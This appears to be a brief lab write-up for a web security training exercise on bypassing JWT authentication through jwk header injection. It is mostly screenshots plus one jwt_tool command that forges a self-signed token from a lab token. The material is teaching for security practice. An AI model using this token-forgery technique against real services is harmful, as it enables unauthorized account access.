# JWT authentication bypass via jwk header injection

In this lab, we will ship a self-signed token with our matching public key. The tool we are going to use is JWT Tool.

![image.png](JWT%20authentication%20bypass%20via%20jwk%20header%20injection/image.png)

Always make sure kid is jwt_tool, otherwise it won’t work

![image.png](JWT%20authentication%20bypass%20via%20jwk%20header%20injection/image%201.png)

```xml
python3 jwt_tool.py eyJraWQiOiJiYmE2MmU4Zi0xMzY0LTQ3MTItYjQzNS1kMTlmMWI5NDBkNDkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MTQ4Mjk5OCwic3ViIjoid2llbmVyIn0.nTBx-9C5poYC7Z1aI9_Ygzn_OBl7dG40Br5xzNFmESKu-cPTlfXw6ppK37F0ZAPCK39440RnoQh5vrNllxNA7rIyc7QBcTaaui8F-2rr0bYnQObdymUpKww4dgy7T4euOw8Z4LmAbbasK8Ajlkj2zJcR1HmKkNRkPVPulLdpB3ltix7tre8KRXA0eZnbSr-Om2TIC3iS4JhQBJGQ0ZcznuBpZxbbI3fQlodKJ5yMQpC-tT0spR2uosMiaCxJl48yCn0ik7SqkisalASIvThKIHSmFtksH0knFYVyVJvzcht5Fla9Y8Wsc4KRpO4QBoqJ2ux5lHZsDSTRgXwVJ_VrPg -X i -T
```

![image.png](JWT%20authentication%20bypass%20via%20jwk%20header%20injection/image%202.png)

![image.png](JWT%20authentication%20bypass%20via%20jwk%20header%20injection/image%203.png)

It works

![image.png](JWT%20authentication%20bypass%20via%20jwk%20header%20injection/image%204.png)

![image.png](JWT%20authentication%20bypass%20via%20jwk%20header%20injection/image%205.png)

![image.png](JWT%20authentication%20bypass%20via%20jwk%20header%20injection/image%206.png)